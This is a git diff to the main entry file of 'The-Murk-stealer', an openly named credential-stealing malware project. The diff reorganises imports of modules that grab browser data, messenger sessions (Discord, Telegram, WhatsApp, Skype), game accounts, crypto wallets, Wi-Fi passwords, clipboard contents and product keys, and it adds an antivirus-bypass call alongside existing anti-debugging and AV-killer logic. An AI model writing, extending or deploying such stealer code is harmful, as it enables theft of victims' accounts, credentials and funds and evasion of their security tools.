@@ -10,41 +10,45 @@
 #             https://github.com/Nick-Vinesmoke/The-Murk-stealer              #
 #-----------------------------------------------------------------------------#
 
-from manager import make_folder
-from system import system_info
-from system import programs
-from system import photos
-from games import Minecraft
-from messengers import telegram
-from manager import send 
-from manager import clear
-from games import steam
-from messengers import discord
-from games import epicGames
-from messengers import whatsapp
-from games import roblox
-from wallets import wallets
-from messengers import skype
-from games import BattleNET
-from games import Uplay
+from scripts.manager import make_folder
+from scripts.system import system_info
+from scripts.system import programs
+from scripts.system import photos
+from scripts.games import Minecraft
+from scripts.messengers import telegram
+from scripts.manager import send 
+from scripts.manager import clear
+from scripts.games import steam
+from scripts.messengers import discord
+from scripts.games import epicGames
+from scripts.messengers import whatsapp
+from scripts.games import roblox
+from scripts.wallets import wallets
+from scripts.messengers import skype
+from scripts.games import BattleNET
+from scripts.games import Uplay
 from config.config import Config
-from manager import ending
-from messengers import viber
-from browsers import chromium
-from files import Files_txt
-from files import file_grabber
-from secure import antiDebug
-from files import filezilla
-from vpn import vpn
-from messengers import pidgin
-from system import productkey
-from system import wifi
-from system import clipboard
-from browsers import geckodriver
+from scripts.manager import ending
+from scripts.messengers import viber
+from scripts.browsers import chromium
+from scripts.files import Files_txt
+from scripts.files import file_grabber
+from scripts.secure import antiDebug
+from scripts.secure import avbypass
+from scripts.files import filezilla
+from scripts.vpn import vpn
+from scripts.messengers import pidgin
+from scripts.system import productkey
+from scripts.system import wifi
+from scripts.system import clipboard
+from scripts.browsers import geckodriver
 
 def Start() -> None:
     if not Config.debuging:
         antiDebug.AntiDebug(Config.oneStart,Config.avKiller)
+        if Config.avbypass:
+            avbypass.AvByPass()
+
     make_folder.makeFolders(Config.enableFileGrabber,Config.oneStart)
 def GrabFiles() -> None:
     if Config.enableFileGrabber:
